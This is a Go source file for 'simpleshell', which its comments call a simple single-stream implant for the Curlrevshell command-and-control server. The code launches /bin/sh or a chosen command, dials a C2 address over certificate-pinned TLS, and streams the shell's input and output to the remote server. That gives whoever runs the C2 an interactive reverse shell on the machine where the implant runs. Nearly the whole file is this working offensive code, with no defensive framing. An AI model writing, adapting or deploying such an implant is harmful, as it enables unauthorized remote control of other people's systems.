// Package simpleshell is a no-frills shell which connects to Curlrevshell.
package simpleshell

/*
 * simpleshell.go
 * Simple single-stream implant
 * By J. Stuart McMurray
 * Created 20241003
 * Last Modified 20250905
 */

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os/exec"
	"strings"

	"github.com/magisterquis/curlrevshell/lib/crsdialer"
)

const (
	// IOPath is the path on Curlrevshell to which we'll connect.
	IOPath = "/io"
	// DefaultShell is the path to the shell used if [GoSimple] is
	// called with no args.
	DefaultShell = "/bin/sh"
)

// ErrNoMatchingCertificate indicates a TLS connection's peer did not present
// a certificate matching a configured fingerprint.
var ErrNoMatchingCertificate = errors.New(
	"no certificate with correct fingerprint found",
)

// ConnConfig describes a connection between a Shell and Curlrevshell.
type ConnConfig struct {
	// C2 is where we find curlrevshell.  Its path should normaly be
	// IOPath.
	C2 string

	// Fingerprint is the Base64-encoded SHA256 hash of the server's TLS
	// certificate, as normally passed to curl --pinnedpubkey.  The
	// leading sha256// is optional.
	Fingerprint string
}

// GoSimple is the simplest way to run a shell.  It wraps [CmdShell],
// [ConnConfig], and [Go].  If args is empty or nil, []string{DefaultShell}
// will be used.
func GoSimple(ctx context.Context, c2, fingerprint string, args []string) error {
	/* Work out our shell. */
	if 0 == len(args) {
		args = []string{DefaultShell}
	}
	shell, err := NewCmdShell(exec.Command(args[0], args[1:]...))
	if nil != err {
		return fmt.Errorf("preparing subprocess: %w", err)
	}

	/* Do it! */
	return Go(ctx, ConnConfig{C2: c2, Fingerprint: fingerprint}, shell)
}

// Go connects a Shell to Curlrevshell.
func Go(ctx context.Context, conf ConnConfig, shell Shell) error {
	defer shell.Output().Close()

	/* Connect to curlrevshell. */
	svr, err := crsdialer.Dial(ctx, conf.C2, conf.Fingerprint)
	if nil != err {
		return fmt.Errorf("connecting to server: %w", err)
	}

	/* Do shell things. */
	go func() { io.Copy(svr, shell.Output()) }()
	shell.SetInput(svr)
	if err := shell.Go(ctx); nil != err {
		return fmt.Errorf("running %s: %w", shell, err)
	}

	return nil
}

// SplitArgs splits s into a slice of strings using the first rune in s as the
// separator.  Runs of empty elements are not compressed.
func SplitArgs(s string) []string {
	/* Empty strings ar easy. */
	if 0 == len(s) {
		return []string{}
	}
	/* Split off the first rune. */
	rs := []rune(s)
	if 0 == len(rs) {
		return []string{}
	}
	sep := rs[0]
	rs = rs[1:]
	/* Split on the first rune. */
	if 0 == len(rs) {
		return []string{}
	}
	return strings.Split(string(rs), string(sep))
}
